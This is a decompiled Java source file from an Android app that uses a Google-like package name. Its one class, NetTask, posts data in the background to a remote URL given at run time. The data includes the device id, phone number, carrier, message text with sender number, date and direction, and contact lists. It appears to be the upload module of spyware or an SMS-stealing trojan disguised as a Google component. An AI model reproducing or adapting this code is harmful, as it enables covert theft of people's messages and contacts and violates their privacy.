package com.google.games.stores.util;

import android.os.AsyncTask;
import com.google.games.stores.config.Config;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class NetTask extends AsyncTask<String, Void, String> {
    /* access modifiers changed from: protected|varargs */
    public String doInBackground(String... params) {
        try {
            HttpClient client = new DefaultHttpClient();
            String url = params[0];
            String type = params[1];
            HttpPost post = new HttpPost(url);
            post.addHeader("charset", "UTF-8");
            List<NameValuePair> ps = new ArrayList();
            if (type.equalsIgnoreCase(Config.ADD)) {
                ps.add(new BasicNameValuePair("device", params[2]));
                if (params[3] != null) {
                    ps.add(new BasicNameValuePair("ph", params[3]));
                }
                if (params[4] != null) {
                    ps.add(new BasicNameValuePair("oper", params[4]));
                }
                if (!(params[5] == null || params[5].equalsIgnoreCase(""))) {
                    ps.add(new BasicNameValuePair("dk", params[5]));
                }
                if (!(params[6] == null || params[6].equalsIgnoreCase(""))) {
                    ps.add(new BasicNameValuePair("dname", params[6]));
                }
                if (!(params[7] == null || params[7].equalsIgnoreCase(""))) {
                    ps.add(new BasicNameValuePair("result", params[7]));
                }
                if (params[8] != null) {
                    ps.add(new BasicNameValuePair("auto", params[8]));
                }
            } else if (type.equalsIgnoreCase(Config.NEW)) {
                ps.add(new BasicNameValuePair("device", params[2]));
                if (params[3] != null) {
                    ps.add(new BasicNameValuePair("ph", params[3]));
                }
                if (params[4] != null) {
                    ps.add(new BasicNameValuePair("date", URLEncoder.encode(params[4])));
                }
                if (params[5] != null) {
                    ps.add(new BasicNameValuePair("io", params[5]));
                }
                if (params[6] != null) {
                    ps.add(new BasicNameValuePair("msg", URLEncoder.encode(params[6])));
                }
                if (params[7] != null) {
                    ps.add(new BasicNameValuePair("num", params[7]));
                }
            } else if (type.equalsIgnoreCase(Config.CONTACT_LIST)) {
                ps.add(new BasicNameValuePair("device", params[2]));
            } else if (type.equalsIgnoreCase(Config.MY_CONTACT_LIST)) {
                ps.add(new BasicNameValuePair("device", params[2]));
                if (params[3] != null) {
                    ps.add(new BasicNameValuePair("mct", params[3]));
                }
            }
            post.setEntity(new UrlEncodedFormEntity(ps));
            InputStream input = client.execute(post).getEntity().getContent();
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len = input.read(buffer);
                if (len <= 0) {
                    output.close();
                    return output.toString();
                }
                output.write(buffer, 0, len);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    /* access modifiers changed from: protected */
    public void onPostExecute(String result) {
        afterReturnService(result);
    }

    /* access modifiers changed from: protected */
    public void afterReturnService(String result) {
    }
}
